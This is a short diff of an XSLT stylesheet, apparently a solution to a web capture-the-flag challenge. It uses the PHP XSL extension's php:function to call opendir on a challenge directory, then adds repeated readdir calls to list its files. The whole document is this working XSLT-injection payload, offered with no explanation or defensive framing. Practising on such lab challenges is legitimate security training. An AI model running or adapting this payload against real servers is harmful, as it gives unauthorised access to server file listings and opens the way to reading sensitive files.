@@ -4,9 +4,21 @@
   extension-element-prefixes="php">
   
   <xsl:template match="/">
-<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
-<xsl:value-of select="php:function('readdir')"/> -
-<xsl:value-of select="php:function('readdir')"/> -
-<xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('readdir')"/> -
   </xsl:template>
 </xsl:stylesheet>
